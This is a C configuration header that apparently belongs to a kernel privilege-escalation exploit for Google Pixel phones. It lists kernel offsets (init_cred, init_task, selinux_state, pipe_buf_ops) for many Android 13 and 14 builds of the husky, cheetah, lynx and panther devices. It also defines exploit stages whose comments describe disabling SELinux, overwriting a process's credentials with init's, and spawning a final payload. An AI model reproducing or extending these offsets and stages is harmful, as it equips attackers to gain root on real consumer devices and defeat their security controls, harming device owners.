#ifndef _CONFIG_H_
#define _CONFIG_H_
#include <stdint.h> 
#include <inttypes.h>

#define OFFSET_TS_REAL_CRED_P7 	0x778
#define OFFSET_TS_CRED_P7 	0x780

#define OFFSET_TS_REAL_CRED_P8 	0x7F8 
#define OFFSET_TS_CRED_P8 	0x800

#define SELINUX_STATE   0 // disable SELinux
#define REAL_CRED_STATE 1 // overwrite task struct->real_cred w. init's
#define TS_CRED_STATE   2 // overwrite task struct->cred w. init's
#define FINISHED_STATE  3 // finished writing, spawn final payload

#define PAGE_OFFSET	  0xffffff8000000000UL
#define VMEMMAP_START_P7  0xfffffffeffe00000UL
#define VMEMMAP_START_P8  0xfffffffe00000000UL


static struct device_config {
	char *fingerprint;
	uint64_t offset_kbase;
	uint64_t offset_sysctl_var;
	uint64_t offset_pipe_buf_ops;
	uint64_t offset_init_task;
	uint64_t offset_init_cred;
	uint64_t offset_selinux_state;
} device_configs[] = {
	{
		.fingerprint = "google/husky/husky:14/UD1A.231105.004/11010374:user/release-keys",
		.offset_kbase = 0x143E4FC,
		.offset_sysctl_var = 0x2619FC8,
		.offset_pipe_buf_ops = 0x18D3770,
		.offset_init_task = 0x27592C0,
		.offset_init_cred = 0x271BFA8,
		.offset_selinux_state = 0x28A3168,
	},	
	{
		.fingerprint = "google/husky/husky:14/UD1A.230803.022/10683547:user/release-keys",
		.offset_kbase = 0x143DFFC,
		.offset_sysctl_var = 0x2619FC8,
		.offset_pipe_buf_ops = 0x18D0230,
		.offset_init_task = 0x2759280,
		.offset_init_cred = 0x271BF88,
		.offset_selinux_state = 0x28A3168,
	},	
	{
		.fingerprint = "google/cheetah/cheetah:14/UP1A.231005.007/10754064:user/release-keys",
		.offset_kbase = 0x1A0F620,
		.offset_sysctl_var = 0x2F09F60,
		.offset_pipe_buf_ops = 0x237D028,
		.offset_init_task = 0x302B0C0,
		.offset_init_cred = 0x2FFFB80,
		.offset_selinux_state = 0x3195970,
	},	
	{
		.fingerprint = "google/cheetah/cheetah:13/TQ3A.230901.001/10750268:user/release-keys",
		.offset_kbase = 0x1A0F580,
		.offset_sysctl_var = 0x2F09F60,
		.offset_pipe_buf_ops = 0x237AEA8,
		.offset_init_task = 0x302B0C0,
		.offset_init_cred = 0x2FFFB58,
		.offset_selinux_state = 0x3195958,
	},
	{
		.fingerprint = "google/cheetah/cheetah:13/TQ3A.230805.001/10316531:user/release-keys",
		.offset_kbase = 0x1A0F580,
		.offset_sysctl_var = 0x2F09F60,
		.offset_pipe_buf_ops = 0x237AEA8,
		.offset_init_task = 0x302B0C0,
		.offset_init_cred = 0x2FFFB58,
		.offset_selinux_state = 0x3195958,
	},
	{
		.fingerprint = "google/cheetah/cheetah:13/TQ3A.230705.001/10216780:user/release-keys",
		.offset_kbase = 0x1A0F580,
		.offset_sysctl_var = 0x2F09F60,
		.offset_pipe_buf_ops = 0x237ACE8,
		.offset_init_task = 0x302B0C0,
		.offset_init_cred = 0x2FFFB58,
		.offset_selinux_state = 0x3195958,
	},
	{
		.fingerprint = "google/cheetah/cheetah:13/TQ3A.230605.012/10204971:user/release-keys",
		.offset_kbase = 0x1A0F580,
		.offset_sysctl_var = 0x2F09F60,
		.offset_pipe_buf_ops = 0x237B028,
		.offset_init_task = 0x302B0C0,
		.offset_init_cred = 0x2FFFB30,
		.offset_selinux_state = 0x3195958,
	},
	{
		.fingerprint = "google/cheetah/cheetah:13/TQ2A.230505.002/9891397:user/release-keys",
		.offset_kbase = 0x1A0F158,
		.offset_sysctl_var = 0x2EF9F60,
		.offset_pipe_buf_ops = 0x23715A8,
		.offset_init_task = 0x301AF00,
		.offset_init_cred = 0x2FF1380,
		.offset_selinux_state = 0x3185968,
	},
	{
		.fingerprint = "google/cheetah/cheetah:13/TQ2A.230405.003.E1/9802792:user/release-keys",
		.offset_kbase = 0x1A0F158,
		.offset_sysctl_var = 0x2EF9F60,
		.offset_pipe_buf_ops = 0x23715E8,
		.offset_init_task = 0x301AF00,
		.offset_init_cred = 0x2FF1380,
		.offset_selinux_state = 0x3185968,
	},
	{ 
		 .fingerprint = "google/cheetah/cheetah:13/TQ2A.230305.008.C1/9619669:user/release-keys",
		.offset_kbase = 0x1A0F158,
		.offset_sysctl_var = 0x2EF9F60,
		.offset_pipe_buf_ops = 0x2371568,
		.offset_init_task = 0x301AF00,
		.offset_init_cred = 0x2FF1380,
		.offset_selinux_state = 0x3185968,
    	},
	{
		.fingerprint = "google/lynx/lynx:14/UP1A.231005.007/10754064:user/release-keys",
		.offset_kbase = 0x1A0F620,
		.offset_sysctl_var = 0x2F09F60,
		.offset_pipe_buf_ops = 0x237D028,
		.offset_init_task = 0x302B0C0,
		.offset_init_cred = 0x2FFFB80,
		.offset_selinux_state = 0x3195970,
	},	
	{ 
		.fingerprint = "google/lynx/lynx:13/TQ3A.230901.001/10750268:user/release-keys", 
		.offset_kbase = 0x1A0F580, 
		.offset_sysctl_var = 0x2F09F60, 
		.offset_pipe_buf_ops = 0x237AEA8, 
		.offset_init_task = 0x302B0C0, 
		.offset_init_cred = 0x2FFFB58, 
		.offset_selinux_state = 0x3195958, 
	}, 
	{ 
		.fingerprint = "google/lynx/lynx:13/TQ3A.230805.001/10316531:user/release-keys", 
		.offset_kbase = 0x1A0F580, 
		.offset_sysctl_var = 0x2F09F60, 
		.offset_pipe_buf_ops = 0x237AEA8, 
		.offset_init_task = 0x302B0C0, 
		.offset_init_cred = 0x2FFFB58, 
		.offset_selinux_state = 0x3195958, 
	}, 
	{
		.fingerprint = "google/lynx/lynx:13/TQ3A.230705.001/10216780:user/release-keys",
		.offset_kbase = 0x1A0F580,
		.offset_sysctl_var = 0x2F09F60,
		.offset_pipe_buf_ops = 0x237ACE8,
		.offset_init_task = 0x302B0C0,
		.offset_init_cred = 0x2FFFB58,
		.offset_selinux_state = 0x3195958,
	},
	{
		.fingerprint = "google/lynx/lynx:13/TQ3A.230605.012/10204971:user/release-keys",
		.offset_kbase = 0x1A0F580,
		.offset_sysctl_var = 0x2F09F60,
		.offset_pipe_buf_ops = 0x237B028,
		.offset_init_task = 0x302B0C0,
		.offset_init_cred = 0x2FFFB30,
		.offset_selinux_state = 0x3195958,
	},
	{
		.fingerprint = "google/lynx/lynx:13/TQ2B.230505.005.A1/9808202:user/release-keys",
		.offset_kbase = 0x1A0F158,
		.offset_sysctl_var = 0x2EF9F60,
		.offset_pipe_buf_ops = 0x23715A8,
		.offset_init_task = 0x301AF00,
		.offset_init_cred = 0x2FF1380,
		.offset_selinux_state = 0x3185968,
	},
	{
		.fingerprint = "google/panther/panther:14/UP1A.231105.003/11010452:user/release-keys",
		.offset_kbase = 0x1A0F620,
		.offset_sysctl_var = 0x2F09F60,
		.offset_pipe_buf_ops = 0x237CD28,
		.offset_init_task = 0x302B0C0,
		.offset_init_cred = 0x2FFFB80,
		.offset_selinux_state = 0x3195970,
	},

	{
		.fingerprint = "google/panther/panther:14/UP1A.231005.007/10754064:user/release-keys",
		.offset_kbase = 0x1A0F620,
		.offset_sysctl_var = 0x2F09F60,
		.offset_pipe_buf_ops = 0x237D028,
		.offset_init_task = 0x302B0C0,
		.offset_init_cred = 0x2FFFB80,
		.offset_selinux_state = 0x3195970,
	},
	{
		.fingerprint = "google/panther/panther:13/TQ3A.230901.001/10750268:user/release-keys",
		.offset_kbase = 0x1A0F580,
		.offset_sysctl_var = 0x2F09F60,
		.offset_pipe_buf_ops = 0x237AEA8,
		.offset_init_task = 0x302B0C0,
		.offset_init_cred = 0x2FFFB58,
		.offset_selinux_state = 0x3195958,
	},
	{
		.fingerprint = "google/panther/panther:13/TQ3A.230805.001/10316531:user/release-keys",
		.offset_kbase = 0x1A0F580,
		.offset_sysctl_var = 0x2F09F60,
		.offset_pipe_buf_ops = 0x237AEA8,
		.offset_init_task = 0x302B0C0,
		.offset_init_cred = 0x2FFFB58,
		.offset_selinux_state = 0x3195958,
	},
	{
		.fingerprint = "google/panther/panther:13/TQ3A.230705.001/10216780:user/release-keys",
		.offset_kbase = 0x1A0F580,
		.offset_sysctl_var = 0x2F09F60,
		.offset_pipe_buf_ops = 0x237ACE8,
		.offset_init_task = 0x302B0C0,
		.offset_init_cred = 0x2FFFB58,
		.offset_selinux_state = 0x3195958,
	},
	{
		.fingerprint = "google/panther/panther:13/TQ3A.230605.012/10204971:user/release-keys",
		.offset_kbase = 0x1A0F580,
		.offset_sysctl_var = 0x2F09F60,
		.offset_pipe_buf_ops = 0x237B028,
		.offset_init_task = 0x302B0C0,
		.offset_init_cred = 0x2FFFB30,
		.offset_selinux_state = 0x3195958,
	},
	{
		.fingerprint = "google/panther/panther:13/TQ2A.230505.002/9891397:user/release-keys",
		.offset_kbase = 0x1A0F158,
		.offset_sysctl_var = 0x2EF9F60,
		.offset_pipe_buf_ops = 0x23715A8,
		.offset_init_task = 0x301AF00,
		.offset_init_cred = 0x2FF1380,
		.offset_selinux_state = 0x3185968,
	},
	{
		.fingerprint = "google/panther/panther:13/TQ2A.230405.003.E1/9802792:user/release-keys",
		.offset_kbase = 0x1A0F158,
		.offset_sysctl_var = 0x2EF9F60,
		.offset_pipe_buf_ops = 0x23715A8,
		.offset_init_task = 0x301AF00,
		.offset_init_cred = 0x2FF1380,
		.offset_selinux_state = 0x3185968,
	},
	{
		.fingerprint = "google/panther/panther:13/TQ2A.230305.008/9595452:user/release-keys",
		.offset_kbase = 0x1A0F158,
		.offset_sysctl_var = 0x2EF9F60,
		.offset_pipe_buf_ops = 0x2371568,
		.offset_init_task = 0x301AF00,
		.offset_init_cred = 0x2FF1380,
		.offset_selinux_state = 0x3185968,		
	},
};

#endif
